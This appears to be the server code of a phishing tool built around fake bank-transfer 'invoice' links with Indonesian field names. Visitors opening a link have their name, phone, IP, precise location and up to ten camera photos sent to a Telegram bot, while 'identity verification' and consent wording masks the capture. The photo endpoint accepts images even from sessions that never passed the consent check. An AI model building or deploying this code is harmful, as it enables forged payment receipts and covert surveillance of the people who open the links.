const express = require('express');
const crypto = require('node:crypto');
const fs = require('node:fs');
const path = require('path');

const MAX_PHOTOS = 10;
const SESSION_TTL_MS = 30 * 60 * 1000;
const MAX_PHOTO_BYTES = 2 * 1024 * 1024;
const INVOICE_ID_PATTERN = /^[A-Za-z0-9_-]{32}$/;

function requiredEnv(name, env = process.env) {
  const value = env[name]?.trim();
  if (!value) throw new Error(`${name} is required`);
  return value;
}

function sha256(value) {
  return crypto.createHash('sha256').update(value).digest('hex');
}

function createTelegramClient({ token, chatId, fetchImpl = global.fetch }) {
  if (typeof fetchImpl !== 'function') throw new Error('A fetch implementation is required');
  const endpoint = method => `https://api.telegram.org/bot${token}/${method}`;

  async function telegramRequest(method, options) {
    const response = await fetchImpl(endpoint(method), options);
    const body = await response.json().catch(() => ({}));
    if (!response.ok || !body.ok) {
      throw new Error(`Telegram ${method} failed (${response.status})`);
    }
    return body.result;
  }

  return {
    sendMessage(text) {
      return telegramRequest('sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text })
      });
    },

    sendPhoto(buffer, { filename, caption }) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('caption', caption);
      form.append('photo', new Blob([buffer], { type: 'image/jpeg' }), filename);
      return telegramRequest('sendPhoto', { method: 'POST', body: form });
    }
  };
}

function cleanText(value, maxLength) {
  return String(value ?? '').trim().replace(/[\u0000-\u001f\u007f]/g, ' ').slice(0, maxLength);
}

function parseInvoice(value) {
  if (!value || typeof value !== 'object') return null;
  const invoice = {
    greetName: cleanText(value.greetName, 80),
    nominal: cleanText(value.nominal, 80),
    metode: cleanText(value.metode, 80),
    biaya: cleanText(value.biaya, 80),
    biayaStatus: cleanText(value.biayaStatus, 80),
    total: cleanText(value.total, 80),
    sumberDana: cleanText(value.sumberDana, 120),
    penerimaNama: cleanText(value.penerimaNama, 100),
    penerimaBank: cleanText(value.penerimaBank, 160),
    tujuan: cleanText(value.tujuan, 100),
    tanggal: cleanText(value.tanggal, 100),
    idTransaksi: cleanText(value.idTransaksi, 100),
    noReferensi: cleanText(value.noReferensi, 100)
  };
  const required = ['nominal', 'total', 'sumberDana', 'penerimaNama', 'penerimaBank', 'tanggal', 'idTransaksi'];
  if (required.some(field => !invoice[field])) return null;
  return invoice;
}

function createMemoryInvoiceStore(initialRecords = []) {
  const records = new Map(initialRecords.map(record => [record.id, { ...record }]));
  return {
    create(invoice) {
      let id;
      do id = crypto.randomBytes(24).toString('base64url'); while (records.has(id));
      const record = { id, invoice: { ...invoice }, createdAt: new Date().toISOString(), verifiedAt: null };
      records.set(id, record);
      return structuredClone(record);
    },
    get(id) {
      const record = records.get(id);
      return record ? structuredClone(record) : null;
    },
    markVerified(id, details = {}) {
      const record = records.get(id);
      if (!record) return null;
      record.verifiedAt = new Date().toISOString();
      record.verifiedBy = cleanText(details.name, 100);
      return structuredClone(record);
    },
    values() {
      return [...records.values()].map(record => structuredClone(record));
    }
  };
}

function createInvoiceStore({ filePath }) {
  let initialRecords = [];
  if (fs.existsSync(filePath)) {
    const parsed = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    initialRecords = Array.isArray(parsed) ? parsed : parsed.invoices;
    if (!Array.isArray(initialRecords)) throw new Error('Invoice store is malformed');
  }
  const memory = createMemoryInvoiceStore(initialRecords);
  const persist = () => {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    const temporaryPath = `${filePath}.${process.pid}.tmp`;
    fs.writeFileSync(temporaryPath, JSON.stringify({ invoices: memory.values() }, null, 2), { mode: 0o600 });
    fs.renameSync(temporaryPath, filePath);
  };
  return {
    create(invoice) {
      const record = memory.create(invoice);
      persist();
      return record;
    },
    get: memory.get,
    markVerified(id, details) {
      const record = memory.markVerified(id, details);
      if (record) persist();
      return record;
    }
  };
}

function parseLocation(location) {
  if (!location || typeof location !== 'object') return null;
  const latitude = Number(location.latitude);
  const longitude = Number(location.longitude);
  const accuracy = Number(location.accuracy);
  if (!Number.isFinite(latitude) || latitude < -90 || latitude > 90) return null;
  if (!Number.isFinite(longitude) || longitude < -180 || longitude > 180) return null;
  return {
    latitude,
    longitude,
    accuracy: Number.isFinite(accuracy) && accuracy >= 0 ? accuracy : null
  };
}

function parsePhoto(dataUrl) {
  if (typeof dataUrl !== 'string') return null;
  const match = dataUrl.match(/^data:image\/jpeg;base64,([A-Za-z0-9+/=]+)$/);
  if (!match) return null;
  const buffer = Buffer.from(match[1], 'base64');
  if (!buffer.length || buffer.length > MAX_PHOTO_BYTES) return null;
  if (buffer.length < 3 || buffer[0] !== 0xff || buffer[1] !== 0xd8 || buffer[2] !== 0xff) return null;
  return buffer;
}

function createRateLimiter({ windowMs, limit }) {
  const entries = new Map();
  return (req, res, next) => {
    const now = Date.now();
    const key = req.ip;
    const entry = entries.get(key);
    if (!entry || entry.resetAt <= now) {
      entries.set(key, { count: 1, resetAt: now + windowMs });
      return next();
    }
    if (entry.count >= limit) return res.status(429).json({ error: 'Too many requests' });
    entry.count += 1;
    next();
  };
}

function createApp({ env = process.env, telegramClient, invoiceStore } = {}) {
  const adminAuthHash = requiredEnv('ADMIN_AUTH_SHA256', env);
  const token = telegramClient ? null : requiredEnv('TELEGRAM_BOT_TOKEN', env);
  const chatId = telegramClient ? null : requiredEnv('TELEGRAM_CHAT_ID', env);
  const telegram = telegramClient || createTelegramClient({ token, chatId });
  const invoices = invoiceStore || createInvoiceStore({
    filePath: env.INVOICE_STORE_PATH || path.join(__dirname, 'data', 'invoices.json')
  });
  const sessions = new Map();
  const app = express();

  app.set('trust proxy', ['loopback', 'linklocal', 'uniquelocal']);
  app.disable('x-powered-by');
  app.use((req, res, next) => {
    res.set({
      'Cache-Control': 'no-store',
      'Content-Security-Policy': "default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self'; media-src 'self' blob:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
      'Permissions-Policy': 'camera=(self), geolocation=(self), microphone=()',
      'Referrer-Policy': 'no-referrer',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY'
    });
    next();
  });
  app.use(express.json({ limit: '4mb', strict: true }));

  function requireAdmin(req, res, next) {
    const supplied = Buffer.from(sha256(req.get('authorization') || ''), 'hex');
    const expected = Buffer.from(adminAuthHash, 'hex');
    if (expected.length === 32 && crypto.timingSafeEqual(supplied, expected)) return next();
    res.set('WWW-Authenticate', 'Basic realm="Invoice Admin"');
    res.status(401).json({ error: 'Admin authentication required' });
  }

  app.get('/api/health', (req, res) => res.json({ ok: true, telegram: true, invoiceLinks: true, maxPhotos: MAX_PHOTOS }));

  app.post('/api/admin/invoices', requireAdmin, createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 60 }), (req, res) => {
    const invoice = parseInvoice(req.body);
    if (!invoice) return res.status(400).json({ error: 'Invoice fields are incomplete' });
    const record = invoices.create(invoice);
    res.status(201).json({ ok: true, id: record.id, path: `/i/${record.id}`, createdAt: record.createdAt });
  });

  app.get('/api/invoices/:invoiceId', (req, res) => {
    const invoiceId = cleanText(req.params.invoiceId, 40);
    if (!INVOICE_ID_PATTERN.test(invoiceId)) return res.status(404).json({ error: 'Invoice not found' });
    const record = invoices.get(invoiceId);
    if (!record) return res.status(404).json({ error: 'Invoice not found' });
    res.json({
      ok: true,
      invoice: record.invoice,
      createdAt: record.createdAt,
      verifiedAt: record.verifiedAt
    });
  });

  app.post('/api/verify', createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 10 }), async (req, res) => {
    try {
      const name = cleanText(req.body.name, 100);
      const phone = cleanText(req.body.phone, 80);
      const invoiceId = cleanText(req.body.invoiceId, 40);
      const sessionId = cleanText(req.body.sessionId, 80);
      const location = parseLocation(req.body.location);
      const consent = req.body.consent === true;
      const photoCount = Math.min(Math.max(Math.round(Number(req.body.photoCount) || 0), 0), MAX_PHOTOS);
      const invoiceRecord = INVOICE_ID_PATTERN.test(invoiceId) ? invoices.get(invoiceId) : null;

      if (name.length < 2 || phone.length < 5) {
        return res.status(400).json({ error: 'Name and phone/ID are required' });
      }
      if (!/^[a-f0-9-]{20,80}$/i.test(sessionId)) {
        return res.status(400).json({ error: 'Invalid session' });
      }
      if (!consent) return res.status(400).json({ error: 'Explicit consent is required' });
      if (!invoiceRecord) return res.status(400).json({ error: 'A valid invoice link is required' });
      if (invoiceRecord.verifiedAt) return res.status(409).json({ error: 'This invoice has already been verified' });

      const existingSession = sessions.get(sessionId);
      if (existingSession && Date.now() - existingSession.createdAt <= SESSION_TTL_MS) {
        existingSession.label = name;
        existingSession.invoiceId = invoiceId;
      } else {
        sessions.set(sessionId, {
          count: 0,
          createdAt: Date.now(),
          label: name,
          invoiceId,
          expectedPhotos: MAX_PHOTOS,
          delivered: new Set(),
          inFlight: false
        });
      }

      const now = new Date();
      const ip = cleanText(req.ip, 80);
      const locationLines = location
        ? [
            `${location.latitude}, ${location.longitude}`,
            `Accuracy: ${location.accuracy === null ? 'unknown' : `${Math.round(location.accuracy)} m`}`,
            `Map: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
          ]
        : ['Not shared / unavailable'];

      await telegram.sendMessage([
        'INTERNAL IDENTITY VERIFICATION',
        '',
        `Invoice link ID: ${invoiceId}`,
        `Invoice transaction: ${invoiceRecord.invoice.idTransaksi}`,
        `Invoice amount: Rp${invoiceRecord.invoice.nominal}`,
        `Invoice sender: ${invoiceRecord.invoice.sumberDana}`,
        `Invoice recipient: ${invoiceRecord.invoice.penerimaNama}`,
        '',
        `Name: ${name}`,
        `Phone / ID: ${phone}`,
        `IP: ${ip}`,
        `Location: ${locationLines.join('\n')}`,
        `Session: ${sessionId}`,
        `Time: ${now.toISOString()}`,
        '',
        'Consent: explicitly accepted in the application before camera/location access.'
      ].join('\n'));

      invoices.markVerified(invoiceId, { name });
      res.json({ ok: true, sessionId, maxPhotos: MAX_PHOTOS });
    } catch (error) {
      console.error('[VERIFY]', error.message);
      res.status(502).json({ error: 'Could not deliver verification data' });
    }
  });

  app.post('/api/capture', createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 120 }), async (req, res) => {
    try {
      const sessionId = cleanText(req.body.sessionId, 80);
      let session = sessions.get(sessionId);
      if (!session || Date.now() - session.createdAt > SESSION_TTL_MS) {
        session = {
          count: 0,
          createdAt: Date.now(),
          label: 'Player',
          invoiceId: cleanText(req.body.invoiceId, 40) || 'unknown',
          expectedPhotos: MAX_PHOTOS,
          delivered: new Set(),
          inFlight: false
        };
        sessions.set(sessionId, session);
      }
      const expectedPhotos = Math.min(session.expectedPhotos || MAX_PHOTOS, MAX_PHOTOS);
      const photoIndex = Math.round(Number(req.body.photoIndex));
      if (!Number.isInteger(photoIndex) || photoIndex < 1 || photoIndex > expectedPhotos) {
        return res.status(400).json({ error: 'Invalid photo index' });
      }
      if (session.delivered?.has(photoIndex)) {
        return res.json({ ok: true, count: session.count, maxPhotos: MAX_PHOTOS, duplicate: true });
      }
      if (session.inFlight) return res.status(409).json({ error: 'Another photo upload is still in progress' });
      if (photoIndex !== session.count + 1) {
        return res.status(409).json({ error: `Expected photo ${session.count + 1}` });
      }
      if (session.count >= expectedPhotos) {
        return res.status(409).json({ error: `Maximum ${expectedPhotos} photos reached for this submission` });
      }

      const photo = parsePhoto(req.body.img);
      if (!photo) return res.status(400).json({ error: 'Invalid JPEG image' });

      session.inFlight = true;
      try {
        await telegram.sendPhoto(photo, {
          filename: `${sessionId}_${photoIndex}.jpg`,
          caption: `Verification photo ${photoIndex}/${expectedPhotos}\nName: ${session.label}\nInvoice: ${session.invoiceId}\nSession: ${sessionId}`
        });
        session.delivered.add(photoIndex);
        session.count = session.delivered.size;
        res.json({ ok: true, count: session.count, maxPhotos: MAX_PHOTOS });
      } finally {
        session.inFlight = false;
      }
    } catch (error) {
      console.error('[CAPTURE]', error.message);
      res.status(502).json({ error: 'Could not deliver verification photo' });
    }
  });

  app.get('/assets/ArchivoBlack-Regular.ttf', (req, res) => {
    res.set('Cache-Control', 'public, max-age=31536000, immutable');
    res.sendFile(path.join(__dirname, 'assets', 'ArchivoBlack-Regular.ttf'));
  });
  app.get('/assets/OFL.txt', (req, res) => {
    res.set('Cache-Control', 'public, max-age=86400');
    res.sendFile(path.join(__dirname, 'assets', 'OFL.txt'));
  });

  app.get(['/', '/player', '/player/', '/i/:invoiceId'], (req, res) => {
    res.sendFile(path.join(__dirname, 'player.html'));
  });
  app.get(['/admin', '/admin/'], requireAdmin, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
  });
  app.get('/index.html', (req, res) => res.redirect(302, '/'));

  app.use((error, req, res, next) => {
    if (error?.type === 'entity.too.large') return res.status(413).json({ error: 'Request is too large' });
    if (error instanceof SyntaxError) return res.status(400).json({ error: 'Invalid JSON' });
    next(error);
  });

  return app;
}

function start() {
  const port = Number(process.env.PORT) || 3000;
  const host = process.env.HOST || '0.0.0.0';
  const app = createApp();
  return app.listen(port, host, () => {
    console.log(`Dashboard listening on http://${host}:${port}`);
  });
}

if (require.main === module) {
  try {
    start();
  } catch (error) {
    console.error(error.message);
    process.exit(1);
  }
}

module.exports = {
  MAX_PHOTOS,
  createApp,
  createInvoiceStore,
  createMemoryInvoiceStore,
  createTelegramClient,
  parseInvoice,
  parseLocation,
  parsePhoto,
  start
};
